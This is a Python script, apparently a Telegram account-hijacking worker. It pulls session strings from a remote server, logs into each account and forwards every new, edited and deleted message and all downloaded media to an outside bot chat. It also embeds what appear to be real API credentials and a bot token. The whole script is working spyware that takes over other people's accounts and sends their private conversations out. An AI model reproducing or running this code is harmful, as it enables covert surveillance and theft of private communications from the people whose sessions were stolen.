import asyncio
from telethon import TelegramClient, events
import requests

API_ID = 30074866  # ← вставь свой
API_HASH = "eea91e3c3b0381b36d455383fe5b9989"  # ← вставь свой

BOT_TOKEN = "8695827916:AAENIQTjiIaorme2RJwdppGLn1_85rjXzkY"
CHAT_ID = "7649175732"

SERVER_URL = "gleaming-truth-production-ed48.up.railway.app"

clients = {}


def send_text(text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            data={
                "chat_id": CHAT_ID,
                "text": text,
                "parse_mode": "HTML"
            }
        )
    except:
        pass


def send_file(path):
    try:
        requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
            data={"chat_id": CHAT_ID},
            files={"document": open(path, "rb")}
        )
    except:
        pass


async def start_client(name, session_string):
    client = TelegramClient(session_string, API_ID, API_HASH)
    await client.start()

    print(f"✅ Запущен: {name}")

    # 🗑 УДАЛЕНИЕ
    @client.on(events.MessageDeleted)
    async def deleted(event):
        msg = f"""
🗑 <b>Удалено сообщение</b>

👤 Аккаунт: {name}
💬 Chat ID: {event.chat_id}
🧾 IDs: {event.deleted_ids}
"""
        send_text(msg)

    # ✏️ ИЗМЕНЕНИЕ
    @client.on(events.MessageEdited)
    async def edited(event):
        sender = await event.get_sender()
        msg = f"""
✏️ <b>Изменено сообщение</b>

👤 Аккаунт: {name}
🙋‍♂️ От: {getattr(sender, 'first_name', '')}
💬 Chat ID: {event.chat_id}
📝 Текст:
{event.text}
"""
        send_text(msg)

    # 📩 НОВЫЕ + МЕДИА
    @client.on(events.NewMessage)
    async def new_msg(event):
        sender = await event.get_sender()

        if event.media:
            file_path = await client.download_media(event.media)
            send_file(file_path)

        msg = f"""
📩 <b>Новое сообщение</b>

👤 Аккаунт: {name}
🙋‍♂️ От: {getattr(sender, 'first_name', '')}
💬 Chat ID: {event.chat_id}
📝 Текст:
{event.text}
"""
        send_text(msg)

    await client.run_until_disconnected()


async def main():
    print("🚀 Worker запущен")

    while True:
        try:
            data = requests.get(f"{SERVER_URL}/sessions").json()

            for acc in data:
                name = acc["name"]
                session = acc["session"]

                if name in clients:
                    continue

                print("➕ Подключаю:", name)

                task = asyncio.create_task(start_client(name, session))
                clients[name] = task

        except Exception as e:
            print("Ошибка:", e)

        await asyncio.sleep(10)


asyncio.run(main())
